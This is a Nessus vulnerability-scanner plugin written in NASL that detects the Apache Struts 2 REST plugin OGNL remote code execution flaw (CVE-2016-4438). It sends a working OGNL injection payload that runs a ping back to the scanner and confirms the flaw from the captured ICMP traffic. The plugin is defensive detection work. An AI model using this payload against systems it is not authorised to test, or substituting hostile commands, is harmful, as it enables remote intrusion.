#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(91811);
  script_version("1.19");
  script_set_attribute(attribute:"plugin_modification_date", value:"2023/07/17");

  script_cve_id("CVE-2016-4438");

  script_name(english:"Apache Struts 2 REST Plugin OGNL Expression Handling RCE");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a web application that uses a Java
framework that is affected by a remote code execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote web application appears to use Apache Struts 2, a web
framework that utilizes OGNL (Object-Graph Navigation Language) as an
expression language. A remote code execution vulnerability exists in
the REST plugin due to improper handling of OGNL expressions. An
unauthenticated, remote attacker can exploit this, via a specially
crafted OGNL expression, to execute arbitrary code.

Note that this plugin only reports the first vulnerable instance of a
Struts 2 application.");
  script_set_attribute(attribute:"see_also", value:"http://struts.apache.org/docs/s2-037.html");
  script_set_attribute(attribute:"see_also", value:"http://struts.apache.org/docs/version-notes-2329.html");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Apache Struts version 2.3.29 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:O/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2016-4438");

  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"false");
  script_set_attribute(attribute:"d2_elliot_name", value:"Apache Struts REST Plugin OGNL Expression Handling RCE");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2016/06/14");
  script_set_attribute(attribute:"patch_publication_date", value:"2016/06/14");
  script_set_attribute(attribute:"plugin_publication_date", value:"2016/06/24");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:apache:struts");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2016-2023 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("http_version.nasl", "webmirror.nasl", "os_fingerprint.nasl");
  script_require_ports("Services/www", 80, 8080);

  exit(0);
}

include("http.inc");
include("url_func.inc");

port = get_http_port(default:8080);
cgis = get_kb_list('www/' + port + '/cgi');

urls = make_list();
# To identify actions that we can test the exploit on we will look
# for files with the .action / .jsp / .do suffix from the KB.
if (!isnull(cgis))
{
  foreach var cgi (cgis)
  {
    match = pregmatch(pattern:"((^.*)(/.+\.act(ion)?)($|\?|;))", string:cgi);
    if (match)
    {
      urls = make_list(urls, match[0]);
      if (!thorough_tests) break;
    }
    match2 = pregmatch(pattern:"(^.*)(/.+\.jsp)$", string:cgi);
    if (!isnull(match2))
    {
      urls = make_list(urls, match2[0]);
      if (!thorough_tests) break;
    }
    match4 = pregmatch(pattern:"(^.*)(/.+\.do)$", string:cgi);
    if (!isnull(match4))
    {
      urls = make_list(urls, match4[0]);
      if (!thorough_tests) break;
    }
    if (cgi =~ "struts2?(-rest)?-showcase")
    {
      urls = make_list(urls, cgi);
      if (!thorough_tests) break;
    }
  }
}

if (thorough_tests)
{
  cgi2 = get_kb_list('www/' + port + '/content/extensions/act*');
  if (!isnull(cgi2)) urls = make_list(urls, cgi2);

  cgi3 = get_kb_list('www/' + port + '/content/extensions/jsp');
  if (!isnull(cgi3)) urls = make_list(urls, cgi3);

  cgi4 = get_kb_list('www/' + port + '/content/extensions/do');
  if (!isnull(cgi4)) urls = make_list(urls, cgi4);
}

# Always check web root
urls = make_list(urls, "/");

# Struts is slow
timeout = get_read_timeout() * 2;
if(timeout < 10)
  timeout = 10;

urls = list_uniq(urls);
scanner_ip = compat::this_host();
target_ip = get_host_ip();
vuln = FALSE;

ua = get_kb_item("global_settings/http_user_agent");
if (empty_or_null(ua))
  ua = 'Nessus';

pat = hexstr(rand_str(length:10));

os = get_kb_item("Host/OS");
if (!empty_or_null(os) && "windows" >< tolower(os))
{
  ping_cmd = "cmd.exe /c ping -n 3 -l 500 " + scanner_ip;
  filter = "icmp and icmp[0] = 8 and src host " + target_ip + " and greater 500";
}
else
{
  ping_cmd = "ping -c 3 -p " + pat + " " + scanner_ip;
  filter = "icmp and icmp[0] = 8 and src host " + target_ip;
}

ping_cmd = urlencode(
  str        : ping_cmd,
  unreserved : "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234" +
                   "56789=&_."
);

foreach var url (urls)
{
  soc = open_sock_tcp(port);
  if (!soc) audit(AUDIT_SOCK_FAIL, port);

  exp_payload = "(%23mem=%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS)%3f@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]):index.xhtml?cmd="+ping_cmd;

  attack_url = url + "/" + exp_payload;

  # Craft GET request
  get_req =
    'GET ' + attack_url + ' HTTP/1.1\n' +
    'Host: ' + target_ip + ':' + port + '\n' +
    'User-Agent: ' + ua + '\n' +
    'Accept-Language: en-US\n' +
    'Connection: Keep-Alive\n\n';

  s = send_capture(socket:soc,data:get_req,pcap_filter:filter,timeout:timeout);
  icmp = tolower(hexstr(get_icmp_element(icmp:s,element:"data")));
  close(soc);

  var snip =  crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30);

  if ("windows" >< tolower(os) && !isnull(icmp))
  {
    vuln = TRUE;
    vuln_url = build_url(qs:attack_url, port:port);
    report =
      '\nNessus confirmed this issue by examining ICMP traffic. '+
      'Below is the response :' +
      '\n\n' + snip +
      '\n' + icmp +
      '\n' + snip +
      '\n';
    break;
  }
  else if (pat >< icmp)
  {
    vuln = TRUE;
    vuln_url = build_url(qs:attack_url, port:port);
    report =
      '\nNessus confirmed this issue by examining ICMP traffic and looking for'+
      '\nthe pattern sent in our packet (' + pat + '). Below is the response :'+
      '\n\n' + snip +
      '\n' + icmp +
      '\n' + snip +
      '\n';
    break;
  }

# Stop after first vulnerable Struts app is found
if (vuln) break;
}

if (!vuln) exit(0, 'No vulnerable applications were detected on the web server listening on port '+port+'.');

security_report_v4(
  port       : port,
  severity   : SECURITY_HOLE,
  generic    : TRUE,
  request    : make_list(vuln_url),
  output     : report
);
